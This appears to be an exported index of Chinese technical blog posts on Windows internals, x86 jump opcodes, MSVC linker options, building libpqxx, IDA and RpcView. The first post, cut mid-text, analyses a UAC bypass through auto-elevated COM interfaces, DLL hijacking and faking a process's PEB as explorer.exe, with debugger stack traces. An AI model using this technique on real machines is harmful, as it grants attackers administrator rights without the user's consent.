弹窗逻辑但是中间弹窗的过程被省略了，这里可以调试分析一下。主要就是通过查看COM组件有没有自提升权限进而判断是否需要弹窗，查看 CuiIsCOMClassAutoApprovable 即可。 越权逻辑越权主要还是基于以下两点，流程上和 consent.exe 是不涉及的。 各类UAC白名单程序的DLL劫持（Dll Hijack） 各类提升权限的COM接口利用（Elevated COM interface） 可利用的COM接口有哪些，可以在 HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\UAC\\\\COMAutoApprovalList 注册表下查看值为 &#x3D;&#x3D;键值项为1&#x3D;&#x3D; 的项为可以自提升的。 本文伪装PEB所示的代码就是通过白名单 g_lpIncludedSystemDirs 实现的。检查的堆栈为： appinfo!RAiGetTokenForCOM -&gt; appinfo!AipGetTokenForService -&gt; appinfo!AiCheckSecureApplicationDirectory -&gt; appinfo!AipCheckSecureWindowsDirectory 或者 AipCheckSecurePFDirectory(取决于传递的路径) 修改为 C:\\windows\\explorer.exe 之后，其相当于从白名单启动的进程，因此可以绕过consent，直接获取权限。 文件启动路径获取程序运行路径的堆栈 123456789101112131415161718192021222324252627282930[0x0] combase!&lt;lambda_7438a189e512c84b56128b16ff6946f3&gt;::operator()+0x9d 0x71d5d8 0x75070f45 [0x1] combase!CRpcResolver::GetConnection+0x70 0x71db48 0x75051915 [0x2] combase!CoInitializeSecurity+0xe5 0x71db78 0x750ed384 [0x3] combase!InitializeSecurity+0x4f 0x71ddec 0x7509196b [0x4] combase!CComApartment::InitRemoting+0x8d 0x71de20 0x750b1ce2 [0x5] combase!CComApartment::StartServer+0x60 0x71de64 0x7506dd3d [0x6] combase!InitChannelIfNecessary+0xb2 0x71de64 0x7506dd3d [0x7] combase!CGIPTable::RegisterInterfaceInGlobalHlp+0x4d 0x71de80 0x7506dce5 [0x8] combase!CGIPTable::RegisterInterfaceInGlobal+0x15 0x71dec0 0x7453b91b [0x9] windows_storage!CFreeThreadedItemContainer::Initialize+0x8b 0x71ded8 0x7453b1b0 [0xa] windows_storage!CFSPropertyStoreFactory_CreateInstance+0x360 0x71df0c 0x7451ab6b [0xb] windows_storage!CFSFolder::_BindToChild+0x10e 0x71e15c 0x7454e000 [0xc] windows_storage!CFSFolder::_Bind+0xa10 0x71e928 0x7454d279 [0xd] windows_storage!CFSFolder::BindToObject+0x4c9 0x71ec3c 0x74562745 [0xe] windows_storage!CShellItem::BindToHandler+0x525 0x71ef1c 0x7455e92e [0xf] windows_storage!CShellItem::_GetPropertyStoreWorker+0x2ee 0x71f1ec 0x7457313d [0x10] windows_storage!CShellItem::GetPropertyStoreForKeys+0x11d 0x71f260 0x745a1977 [0x11] windows_storage!CShellItem::GetString+0x57 0x71f4e8 0x745a18e3 [0x12] windows_storage!IShellItem_GetFileName+0x5b 0x71f530 0x745a0934 [0x13] windows_storage!CPendingOperation::AddToTree+0x114 0x71f55c 0x745a07fb [0x14] windows_storage!CCopyTree::InitializeFromPendingList+0x9a 0x71f7b0 0x7459224f [0x15] windows_storage!CFileOperation::PerformOperations+0xaf 0x71f7d4 0x543f55 [0x16] MasqueradePEBtoCopyfile!wmain+0x365 0x71f818 0x5447fe [0x17] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0x71f97c 0x544667 [0x18] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0x71f990 0x5444fd [0x19] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0x71f9ec 0x544878 [0x1a] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0x71f9f4 0x7612fcc9 [0x1b] KERNEL32!BaseThreadInitThunk+0x19 0x71f9fc 0x76fd7c6e [0x1c] ntdll!__RtlUserThreadStart+0x2f 0x71fa0c 0x76fd7c3e [0x1d] ntdll!_RtlUserThreadStart+0x1b 0x71fa68 0x0 获取dll的堆栈 12[0x0] ntdll!LdrGetDllFullName 0x71d974 0x76de5a56 [0x1] KERNELBASE!GetModuleFileNameW+0x46 0x71d978 0x750ff6ee","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"COM","slug":"COM","permalink":"http://example.com/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"http://example.com/categories/A-OS/Windows/COM/"}]},{"title":"【汇编】JCC","date":"2023-11-19T16:00:00.000Z","path":"B_Code/汇编/【汇编】JCC/","text":"概述: JCC 汇编指令 0x01 指令全英 指令 FALG A above ZF&#x3D;0 OR CF&#x3D;0 B blow CF&#x3D;1 E equal ZF&#x3D;1 N not C carry CF&#x3D;1 G great SF&#x3D;&#x3D;OF &amp;&amp; ZF&#x3D;0 L less SF!&#x3D;OF O overflow OF&#x3D;1 P parity even 奇偶 PF&#x3D;1 S sign为负 SF&#x3D;1 Z zero为0 ZF&#x3D;1 0x02 基于特定标志位值的跳转 指令 说明 JC 进位跳转（进位标志位置 1） JNC 无进位跳转（进位标志位清零） JZ&#x2F;JE 结果为零则跳转（相等时跳转） JNZ 结果不为零则跳转（不相等时跳转） JS 结果为负则跳转 JNS 结果为非负则跳转 JP 结果中1的个数为偶数则跳转 JNP 结果中1的个数为奇数则跳转 JO 结果溢出了则跳转 JNO 结果没有溢出则跳转 0x03 JCC满足条件时跳转 操作码 指令 说明 77 cb JA rel8 高于（CF&#x3D;0 且 ZF&#x3D;0）时短跳转 73 cb JAE rel8 高于或等于 (CF&#x3D;0) 时短跳转 72 cb JB rel8 低于 (CF&#x3D;1) 时短跳转 76 cb JBE rel8 低于或等于（CF&#x3D;1 或 ZF&#x3D;1）时短跳转 72 cb JC rel8 进位 (CF&#x3D;1) 时短跳转 E3 cb JCXZ rel8 CX 寄存器为 0 时短跳转 E3 cb JECXZ rel8 ECX 寄存器为 0 时短跳转 74 cb JE rel8 等于 (ZF&#x3D;1) 时短跳转 7F cb JG rel8 大于（ZF&#x3D;0 且 SF&#x3D;OF）时短跳转 7D cb JGE rel8 大于或等于 (SF&#x3D;OF) 时短跳转 7C cb JL rel8 小于 (SF&lt;&gt;OF) 时短跳转 7E cb JLE rel8 小于或等于（ZF&#x3D;1 或 SF&lt;&gt;OF）时短跳转 76 cb JNA rel8 不高于（CF&#x3D;1 或 ZF&#x3D;1）时短跳转 72 cb JNAE rel8 不高于或等于 (CF&#x3D;1) 时短跳转 73 cb JNB rel8 不低于 (CF&#x3D;0) 时短跳转 77 cb JNBE rel8 不低于或等于（CF&#x3D;0 或 ZF&#x3D;0）时短跳转 73 cb JNC rel8 无进位 (CF&#x3D;0) 时短跳转 75 cb JNE rel8 不相等 (ZF&#x3D;0) 时短跳转 7E cb JNG rel8 不大于（ZF&#x3D;1 或 SF&lt;&gt;OF）时短跳转 7C cb JNGE rel8 不大于或等于 (SF&lt;&gt;OF) 时短跳转 7D cb JNL rel8 不小于 (SF＝OF) 时短跳转 7F cb JNLE rel8 不小于或等于（ZF&#x3D;0 且 SF&#x3D;OF）时短跳转 71 cb JNO rel8 不上溢 (OF&#x3D;0) 时短跳转 7B cb JNP rel8 奇校验 (PF&#x3D;0) 时短跳转 79 cb JNS rel8 正数时 (SF＝0) 短跳转 75 cb JNZ rel8 不为零 (ZF&#x3D;0) 时短跳转 70 cb JO rel8 上溢 (OF&#x3D;1) 时短跳转 7A cb JP rel8 偶校验 (PF&#x3D;1) 时短跳转 7A cb JPE rel8 偶校验 (PF&#x3D;1) 时短跳转 7B cb JPO rel8 奇校验 (PF&#x3D;0) 时短跳转 78 cb JS rel8 负数 (SF&#x3D;1) 时短跳转 74 cb JZ rel8 为零 (ZF&#x3D;1) 时短跳转 0F 87 cw&#x2F;cd JA rel16&#x2F;32 高于（CF&#x3D;0 且 ZF&#x3D;0）时近跳转 0F 83 cw&#x2F;cd JAE rel16&#x2F;32 高于或等于 (CF&#x3D;0) 时近跳转 0F 82 cw&#x2F;cd JB rel16&#x2F;32 低于 (CF&#x3D;1) 时近跳转 0F 86 cw&#x2F;cd JBE rel16&#x2F;32 低于或等于（CF&#x3D;1 或 ZF&#x3D;1）时近跳转 0F 82 cw&#x2F;cd JC rel16&#x2F;32 进位 (CF&#x3D;1) 时近跳转 0F 84 cw&#x2F;cd JE rel16&#x2F;32 相等 (ZF&#x3D;1) 时近跳转 0F 84 cw&#x2F;cd JZ rel16&#x2F;32 为 0 (ZF&#x3D;1) 时近跳转 0F 8F cw&#x2F;cd JG rel16&#x2F;32 大于（ZF&#x3D;0 且 SF&#x3D;OF）时近跳转 操作码 指令 说明 0F 8D cw&#x2F;cd JGE rel16&#x2F;32 大于或等于 (SF&#x3D;OF) 时近跳转 0F 8C cw&#x2F;cd JL rel16&#x2F;32 小于 (SF&lt;&gt;OF) 时近跳转 0F 8E cw&#x2F;cd JLE rel16&#x2F;32 小于或等于（ZF&#x3D;1 或 SF&lt;&gt;OF）时近跳转 0F 86 cw&#x2F;cd JNA rel16&#x2F;32 不高于（CF&#x3D;1 或 ZF&#x3D;1）时近跳转 0F 82 cw&#x2F;cd JNAE rel16&#x2F;32 不高于或等于 (CF&#x3D;1) 时近跳转 0F 83 cw&#x2F;cd JNB rel16&#x2F;32 不低于 (CF&#x3D;0) 时近跳转 0F 87 cw&#x2F;cd JNBE rel16&#x2F;32 不低于或等于（CF&#x3D;0 或 ZF&#x3D;0）时近跳转 0F 83 cw&#x2F;cd JNC rel16&#x2F;32 无进位 (CF&#x3D;0) 时近跳转 0F 85 cw&#x2F;cd JNE rel16&#x2F;32 不相等 (ZF&#x3D;0) 时近跳转 0F 8E cw&#x2F;cd JNG rel16&#x2F;32 不大于（ZF&#x3D;1 或 SF&lt;&gt;OF）时近跳转 0F 8C cw&#x2F;cd JNGE rel16&#x2F;32 不大于或等于 (SF&lt;&gt;OF) 时近跳转 0F 8D cw&#x2F;cd JNL rel16&#x2F;32 不小于 (SF＝OF) 时近跳转 0F 8F cw&#x2F;cd JNLE rel16&#x2F;32 不小于或等于（ZF&#x3D;0 且 SF&#x3D;OF）时近跳转 0F 81 cw&#x2F;cd JNO rel16&#x2F;32 不上溢 (OF&#x3D;0) 时近跳转 0F 8B cw&#x2F;cd JNP rel16&#x2F;32 奇校验 (PF&#x3D;0) 时近跳转 0F 89 cw&#x2F;cd JNS rel16&#x2F;32 正数 (SF＝0) 时近跳转 0F 85 cw&#x2F;cd JNZ rel16&#x2F;32 不为零 (ZF&#x3D;0) 时近跳转 0F 80 cw&#x2F;cd JO rel16&#x2F;32 上溢 (OF&#x3D;1) 时近跳转 0F 8A cw&#x2F;cd JP rel16&#x2F;32 偶校验 (PF&#x3D;1) 时近跳转 0F 8A cw&#x2F;cd JPE rel16&#x2F;32 偶校验 (PF&#x3D;1) 时近跳转 0F 8B cw&#x2F;cd JPO rel16&#x2F;32 奇校验 (PF&#x3D;0) 时近跳转 0F 88 cw&#x2F;cd JS rel16&#x2F;32 负数 (SF＝1) 时近跳转 0F 84 cw&#x2F;cd JZ rel16&#x2F;32 为 0 (ZF&#x3D;1) 时近跳转","tags":[{"name":"汇编","slug":"汇编","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"【Visual Studio】 MSVC链接器选项","date":"2023-11-17T02:44:56.766Z","path":"A_OS/Windows/Visual Studio/【Visual Studio】MSVC链接器选项/","text":"概述：冷知识。MSVC 链接器选项设置 0x01 MSVC链接器选项设置MSVC 链接器参考 | Microsoft Learn 0x02 Demo&#x2F;LARGEADDRESSAWARE 拥有更大用户态内存&#x2F;LARGEADDRESSAWARE 选项指示链接器，应用程序可以处理大于 2 GB 的地址。 在 64 位编译器中，此选项默认处于启用状态。 在 32 位编译器中，如果未在链接器行上指定 &#x2F;LARGEADDRESSAWARE，则启用 &#x2F;LARGEADDRESSAWARE:NO。 如果应用程序已链接到 &#x2F;LARGEADDRESSAWARE，则 DUMPBIN &#x2F;HEADERS 将显示该效果的信息。","tags":[{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【PostgreSQL】windows下编译pqxx","date":"2023-11-16T06:40:46.281Z","path":"C_OpenSource/pqxx/","text":"概述：windows下编译libpq :dango: 注意1：PostgreSQL 从版本10之后就只有64位了。使用pqxx也不用考虑32位 使用版本说明： PostGreSQL: 16.1 pqxx: 7.7.6 :dango: 注意2: pqxx 使用的是 C++17 0x01 前言what: The official C++ client API for PostgreSQL. 0x02 下载源码 postgresql二进制文件下载链接 Community DL Page pqxx jtv&#x2F;libpqxx at 7.7 源码仓库提供了windows下快速编译libpq的方法。但不好用，本人尝试但未能成功。 Easy-PQXX-Build-for-Windows-Visual-Studio GordonLElliott&#x2F;Easy-PQXX-Build-for-Windows-Visual-Studio: Quickly build libpqxx, the official C++ client API for PostgreSQL, in Windows environment with Visual Studio. Create both Debug and Release configurations with optional efficiency patches, install in Program Files directory, create property sheets to easily use in Visual Studio applications, with named versions for configurations, and options. 0x03 使用 cmake 编译 pqxx编译编译 pqxx 需要 PostGreSQL 的运行环境，因此需要下载二进制包才能编译成功。去 PostgreSQL 官网下载安装包或者二进制包都可以。 下载完成后，分两种情况，如果是下载的安装包，安装 postgresql 后直接用 cmake 编译就可以了，如果下载的是二进制文件，则需要配置cmake的变量如下所示，直接修改根目录的 CMakeLists.txt 1234567891011121314151617181920cmake_minimum_required(VERSION 3.8)file(READ VERSION VER_FILE_CONTENT)string(STRIP $&#123;VER_FILE_CONTENT&#125; VER_FILE_CONTENT)project( libpqxx VERSION $&#123;VER_FILE_CONTENT&#125; LANGUAGES CXX)# 在这里声明 postgresql 的二进制根目录，根据个人下情况配置即可set(PostgreSQL_ROOT &quot;D:\\\\Documents\\\\postgresql\\\\postgresql-16.1-1-windows-x64-binaries\\\\pgsql&quot;)if(NOT &quot;$&#123;CMAKE_CXX_STANDARD&#125;&quot;) set(CMAKE_CXX_STANDARD 17)endif()set(CMAKE_CXX_STANDARD_REQUIRED ON)set(CMAKE_CXX_EXTENSIONS OFF)set(CMAKE_MODULE_PATH $&#123;PROJECT_SOURCE_DIR&#125;/cmake) 然后就是使用 cmake 编译了，目前 VSCode 和 Visual Studio 都支持 CMake 文件的编译，直接编译即可。 这里使用 Visual Studio 编译后，会在 out 目录下生成lib文件，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363D:\\Documents\\A_Source\\OpenSource\\libpqxx\\out&gt;tree /F卷 本地磁盘 的文件夹 PATH 列表卷序列号为 724D-690ED:.├─build│ └─x64-Debug│ │ .ninja_deps│ │ .ninja_log│ │ build.ninja│ │ CMakeCache.txt│ │ cmake_install.cmake│ │ CPackConfig.cmake│ │ CPackSourceConfig.cmake│ │ install_manifest.txt│ │ libpqxx-config-version.cmake│ │ libpqxx-config.cmake│ │ libpqxx-targets.cmake│ │ libpqxx.pc│ │ VSInheritEnvironments.txt│ ││ ├─.cmake│ │ └─api│ │ └─v1│ │ ├─query│ │ │ └─client-MicrosoftVS│ │ │ query.json│ │ ││ │ └─reply│ │ cache-v2-4c1f3ae5d14ffd09e2dd.json│ │ cmakeFiles-v1-6f2def4807820d15719b.json│ │ codemodel-v2-8933aef952d7508a3af3.json│ │ directory-.-Debug-6b54e12c0d4bd01edfca.json│ │ directory-include-Debug-ba96d77232f254970ce6.json│ │ directory-src-Debug-5d1cc30954eb9bce3508.json│ │ directory-test-Debug-f18be1977b403cfd1a50.json│ │ index-2023-11-16T09-03-01-0309.json│ │ target-pqxx-Debug-08c4b9d672ef282e41c8.json│ │ target-runner-Debug-b625a8b78dd4666c4f11.json│ │ toolchains-v1-3b995f712f6d6e9a85c1.json│ ││ ├─CMakeFiles│ │ │ cmake.check_cache│ │ │ CMakeConfigureLog.yaml│ │ │ rules.ninja│ │ │ TargetDirectories.txt│ │ ││ │ ├─3.26.4-msvc4│ │ │ │ CMakeCXXCompiler.cmake│ │ │ │ CMakeDetermineCompilerABI_CXX.bin│ │ │ │ CMakeRCCompiler.cmake│ │ │ │ CMakeSystem.cmake│ │ │ ││ │ │ └─CompilerIdCXX│ │ │ │ CMakeCXXCompilerId.cpp│ │ │ │ CMakeCXXCompilerId.exe│ │ │ │ CMakeCXXCompilerId.obj│ │ │ ││ │ │ └─tmp│ │ ├─CMakeTmp│ │ ├─Export│ │ │ └─d6b66e93f8212dd1f00debf9f6654819│ │ │ libpqxx-targets-debug.cmake│ │ │ libpqxx-targets.cmake│ │ ││ │ ├─pkgRedirects│ │ └─ShowIncludes│ │ foo.h│ │ main.c│ │ main.obj│ ││ ├─include│ │ │ cmake_install.cmake│ │ ││ │ ├─CMakeFiles│ │ └─pqxx│ │ config-internal-compiler.h│ │ config-internal-libpq.h│ │ config-public-compiler.h│ │ config_cmake.h.in│ ││ ├─src│ │ │ cmake_install.cmake│ │ │ pqxx.lib│ │ ││ │ └─CMakeFiles│ │ └─pqxx.dir│ │ array.cxx.obj│ │ binarystring.cxx.obj│ │ blob.cxx.obj│ │ connection.cxx.obj│ │ cursor.cxx.obj│ │ encodings.cxx.obj│ │ errorhandler.cxx.obj│ │ except.cxx.obj│ │ field.cxx.obj│ │ largeobject.cxx.obj│ │ notification.cxx.obj│ │ params.cxx.obj│ │ pipeline.cxx.obj│ │ pqxx.pdb│ │ result.cxx.obj│ │ robusttransaction.cxx.obj│ │ row.cxx.obj│ │ sql_cursor.cxx.obj│ │ strconv.cxx.obj│ │ stream_from.cxx.obj│ │ stream_to.cxx.obj│ │ subtransaction.cxx.obj│ │ time.cxx.obj│ │ transaction.cxx.obj│ │ transaction_base.cxx.obj│ │ util.cxx.obj│ │ version.cxx.obj│ │ wait.cxx.obj│ ││ ├─test│ │ │ cmake_install.cmake│ │ │ CTestTestfile.cmake│ │ │ runner.exe│ │ │ runner.ilk│ │ │ runner.pdb│ │ ││ │ └─CMakeFiles│ │ └─runner.dir│ │ │ embed.manifest│ │ │ intermediate.manifest│ │ │ manifest.rc│ │ │ manifest.res│ │ │ runner.cxx.obj│ │ │ test00.cxx.obj│ │ │ test01.cxx.obj│ │ │ test02.cxx.obj│ │ │ test04.cxx.obj│ │ │ test07.cxx.obj│ │ │ test10.cxx.obj│ │ │ test11.cxx.obj│ │ │ test13.cxx.obj│ │ │ test14.cxx.obj│ │ │ test16.cxx.obj│ │ │ test17.cxx.obj│ │ │ test18.cxx.obj│ │ │ test20.cxx.obj│ │ │ test21.cxx.obj│ │ │ test26.cxx.obj│ │ │ test29.cxx.obj│ │ │ test30.cxx.obj│ │ │ test32.cxx.obj│ │ │ test37.cxx.obj│ │ │ test39.cxx.obj│ │ │ test46.cxx.obj│ │ │ test56.cxx.obj│ │ │ test60.cxx.obj│ │ │ test61.cxx.obj│ │ │ test62.cxx.obj│ │ │ test69.cxx.obj│ │ │ test70.cxx.obj│ │ │ test71.cxx.obj│ │ │ test72.cxx.obj│ │ │ test74.cxx.obj│ │ │ test75.cxx.obj│ │ │ test76.cxx.obj│ │ │ test77.cxx.obj│ │ │ test78.cxx.obj│ │ │ test79.cxx.obj│ │ │ test82.cxx.obj│ │ │ test84.cxx.obj│ │ │ test87.cxx.obj│ │ │ test88.cxx.obj│ │ │ test89.cxx.obj│ │ │ test90.cxx.obj│ │ │ vc140.pdb│ │ ││ │ └─unit│ │ test_array.cxx.obj│ │ test_binarystring.cxx.obj│ │ test_blob.cxx.obj│ │ test_cancel_query.cxx.obj│ │ test_column.cxx.obj│ │ test_composite.cxx.obj│ │ test_connection.cxx.obj│ │ test_cursor.cxx.obj│ │ test_encodings.cxx.obj│ │ test_errorhandler.cxx.obj│ │ test_error_verbosity.cxx.obj│ │ test_escape.cxx.obj│ │ test_exceptions.cxx.obj│ │ test_field.cxx.obj│ │ test_float.cxx.obj│ │ test_largeobject.cxx.obj│ │ test_nonblocking_connect.cxx.obj│ │ test_notification.cxx.obj│ │ test_pipeline.cxx.obj│ │ test_prepared_statement.cxx.obj│ │ test_range.cxx.obj│ │ test_read_transaction.cxx.obj│ │ test_result_iteration.cxx.obj│ │ test_result_slicing.cxx.obj│ │ test_row.cxx.obj│ │ test_separated_list.cxx.obj│ │ test_simultaneous_transactions.cxx.obj│ │ test_sql_cursor.cxx.obj│ │ test_stateless_cursor.cxx.obj│ │ test_strconv.cxx.obj│ │ test_stream_from.cxx.obj│ │ test_stream_to.cxx.obj│ │ test_string_conversion.cxx.obj│ │ test_subtransaction.cxx.obj│ │ test_test_helpers.cxx.obj│ │ test_thread_safety_model.cxx.obj│ │ test_time.cxx.obj│ │ test_transaction.cxx.obj│ │ test_transaction_base.cxx.obj│ │ test_transaction_focus.cxx.obj│ │ test_transactor.cxx.obj│ │ test_type_name.cxx.obj│ │ test_zview.cxx.obj│ ││ └─Testing│ └─Temporary│ LastTest.log│└─install └─x64-Debug ├─include │ └─pqxx │ │ array │ │ array.hxx │ │ binarystring │ │ binarystring.hxx │ │ blob │ │ blob.hxx │ │ composite │ │ composite.hxx │ │ config-public-compiler.h │ │ connection │ │ connection.hxx │ │ cursor │ │ cursor.hxx │ │ dbtransaction │ │ dbtransaction.hxx │ │ errorhandler │ │ errorhandler.hxx │ │ except │ │ except.hxx │ │ field │ │ field.hxx │ │ isolation │ │ isolation.hxx │ │ largeobject │ │ largeobject.hxx │ │ nontransaction │ │ nontransaction.hxx │ │ notification │ │ notification.hxx │ │ params │ │ params.hxx │ │ pipeline │ │ pipeline.hxx │ │ pqxx │ │ prepared_statement │ │ prepared_statement.hxx │ │ range │ │ range.hxx │ │ result │ │ result.hxx │ │ robusttransaction │ │ robusttransaction.hxx │ │ row │ │ row.hxx │ │ separated_list │ │ separated_list.hxx │ │ strconv │ │ strconv.hxx │ │ stream_from │ │ stream_from.hxx │ │ stream_to │ │ stream_to.hxx │ │ subtransaction │ │ subtransaction.hxx │ │ time │ │ time.hxx │ │ transaction │ │ transaction.hxx │ │ transaction_base │ │ transaction_base.hxx │ │ transaction_focus │ │ transaction_focus.hxx │ │ transactor │ │ transactor.hxx │ │ types │ │ types.hxx │ │ util │ │ util.hxx │ │ version │ │ version.hxx │ │ zview │ │ zview.hxx │ │ │ └─internal │ │ array-composite.hxx │ │ callgate.hxx │ │ concat.hxx │ │ conversions.hxx │ │ encodings.hxx │ │ encoding_group.hxx │ │ header-post.hxx │ │ header-pre.hxx │ │ ignore-deprecated-post.hxx │ │ ignore-deprecated-pre.hxx │ │ libpq-forward.hxx │ │ result_iter.hxx │ │ result_iterator.hxx │ │ sql_cursor.hxx │ │ statement_parameters.hxx │ │ stream_iterator.hxx │ │ wait.hxx │ │ │ └─gates │ connection-errorhandler.hxx │ connection-largeobject.hxx │ connection-notification_receiver.hxx │ connection-pipeline.hxx │ connection-sql_cursor.hxx │ connection-stream_from.hxx │ connection-stream_to.hxx │ connection-transaction.hxx │ errorhandler-connection.hxx │ icursorstream-icursor_iterator.hxx │ icursor_iterator-icursorstream.hxx │ result-connection.hxx │ result-creation.hxx │ result-pipeline.hxx │ result-sql_cursor.hxx │ transaction-sql_cursor.hxx │ transaction-transaction_focus.hxx │ ├─lib │ │ pqxx.lib │ │ │ ├─cmake │ │ └─libpqxx │ │ libpqxx-config-version.cmake │ │ libpqxx-config.cmake │ │ libpqxx-targets-debug.cmake │ │ libpqxx-targets.cmake │ │ │ └─pkgconfig │ libpqxx.pc │ └─share └─doc └─libpqxx accessing-results.md binary-data.md datatypes.md escaping.md getting-started.md mainpage.md parameters.md performance.md prepared-statement.md streams.md thread-safety.md ⚠ 然后就可以编代码使用 pqxx.lib 了。除此之外，在编译项目时还需要添加 libpq.lib. 除此之外可以看到以下两个目录，这两个目录待会要引入到 VS 工程中： include：D:\\Documents\\A_Source\\OpenSource\\libpqxx\\out\\install\\x64-Debug\\include lib: D:\\Documents\\A_Source\\OpenSource\\libpqxx\\out\\install\\x64-Debug\\lib 还需引入 libpq.lib 的目录。 使用以下代码可直接使用，自测是没问题的。 如果有编译报错 C4996: &#39;_Header_ciso646&#39;，关闭 &#x3D;&#x3D;SDL检查&#x3D;&#x3D; 再编译试试。 另外补充一点，编译的PE文件运行时依赖很多dll，包括但不限于 libpq.dll、libssl 等，可以选择部署到另外一台机器上，同时部署 C++ 运行时文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;pqxx/pqxx&gt;#include &lt;pqxx/transaction&gt;int main(int argc, char* argv[])&#123; // (Normally you&#x27;d check for valid command-line arguments.) if (argc &lt; 3) &#123; printf(&quot;Usage:\\n %s &lt;username&gt; &lt;password&gt;&quot;, argv[0]); exit(-1); &#125; char conn[MAX_PATH]; sprintf(conn, &quot;postgresql://%s:%s@localhost/postgres&quot;, argv[1], argv[2]); try &#123; pqxx::connection c&#123; conn &#125;; pqxx::work txn&#123; c &#125;; // For querying just one single value, the transaction has a shorthand method // query_value(). // // Use txn.quote() to escape and quote a C++ string for use as an SQL string // in a query&#x27;s text. pqxx::result res = txn.exec(&quot;SELECT * FROM pg_authid&quot;); for (int i = 0; i &lt; res.size(); i++) &#123; for(int j = 0; j &lt; res[i].size(); j++) std::cout &lt;&lt; &quot;&quot; &lt;&lt; res[i].at(j) &lt;&lt; &#x27;\\t&#x27;; std::cout &lt;&lt; &#x27;\\n&#x27;; &#125; &#125; catch (std::bad_alloc const&amp;) &#123; std::cerr &lt;&lt; &quot;Out of memory!&quot; &lt;&lt; std::endl; &#125; catch (pqxx::sql_error const&amp; e) &#123; std::cerr &lt;&lt; &quot;SQL error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl &lt;&lt; &quot;Query was: &quot; &lt;&lt; e.query() &lt;&lt; std::endl; &#125; catch (std::exception const&amp; e) &#123; std::cerr &lt;&lt; &quot;Exception: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Unknown exception&quot; &lt;&lt; std::endl; &#125;&#125; 在安装postgresql的机器上输出如下所示：","tags":[{"name":"libpq","slug":"libpq","permalink":"http://example.com/tags/libpq/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"【工具】IDA 使用详记","date":"2023-11-08T16:00:00.000Z","path":"G_工具/【工具】IDA 使用详记/","text":"Exports 窗口Exports 窗口展示了当前 PE 文件的导出接口信息。 在IDA Pro的Exports窗口中，每个函数名称旁边的字母可能有多种含义，具体取决于函数的属性。 在Exports窗口中，通常会看到以下几种字母标识： “I”：表示该函数是导入的（Imported）。这通常意味着这个函数是由另一个模块提供的，而不是当前分析的模块。导入的函数通常在调用其他模块的函数时使用。 “D”：表示该函数是导出的（Declared）。这通常意味着该函数是当前模块声明的，但并未实现。导出的函数通常是为了允许其他模块通过名称链接（name mangling）来调用它们。 “F”：表示该函数是已定义的（Defined）。这通常意味着该函数在当前的模块中已经实现。","tags":[],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"【RPC】RpcView是如何检测的","date":"2023-11-07T16:00:00.000Z","path":"A_OS/Windows/RPC/【RPC】RpcView 相关/","text":"概述：RpcView 代码学习及扫描逻辑整理 0x01 RpcView 代码学习silverf0x&#x2F;RpcView: RpcView is a free tool to explore and decompile Microsoft RPC interfaces。 RpcView 是一款开源的 Windows RPC 监控工具。界面部分是用Qt实现的，功能是C\\C++写的，功能部分涉及到枚举系统的rpc并且还实现了rpc的反汇编。不管是要研究 RPC 还是学习代码逻辑、规范等，都比较有参考意义。 本文主要是看功能部分，界面部分暂不涉及。 0x02 Rpc扫描 可以看出来 RpcView 这款软件的强大之处哈，rpc的所有信息都可以拿到。 扫描逻辑一个基础概念：&#x3D;&#x3D;PE文件结构：DOS头+PE头+节表+.data&#x2F;.rdata&#x2F;.text&#x3D;&#x3D; 简单画个 flow 看下 RpcView 的相关调用流程,以获取一个进程为例（仅涉及rpc部分，其他信息获取逻辑看源码即可，补充一篇整理的PE相关的文章 windows：【PE】PE文件结构（一） - oone）。 flowchart LR A[RpcCoreGetProcessInfo\\n获取一个进程的信息,包括rpc信息] --> B[GetRpcServerAddressInProcess\\n获取rpc信息结构体 pRpcCoreInternalCtxt] B --> C[GetModuleDataSection\\n获取RPCRT4.dll的.data数据段 ModuleSectionInfo] C --> D[通过 